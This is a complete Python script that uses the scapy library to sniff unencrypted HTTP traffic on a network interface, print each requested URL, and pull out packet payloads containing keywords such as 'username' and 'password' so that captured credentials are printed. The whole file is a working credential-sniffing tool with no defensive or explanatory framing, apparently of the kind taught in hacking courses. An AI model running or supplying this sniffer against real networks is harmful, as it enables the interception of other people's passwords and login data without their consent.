import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="ip")

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass", "email"]
        for keyword in keywords:
            if keyword in load.decode("utf-8").lower():
                return load
    return None

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode("utf-8"))
        login_info = get_login_info(packet)
        if login_info:
            print("[+] Possible username/password found: " + login_info.decode("utf-8"))
            
        #print(packet.show())

sniff("eth0")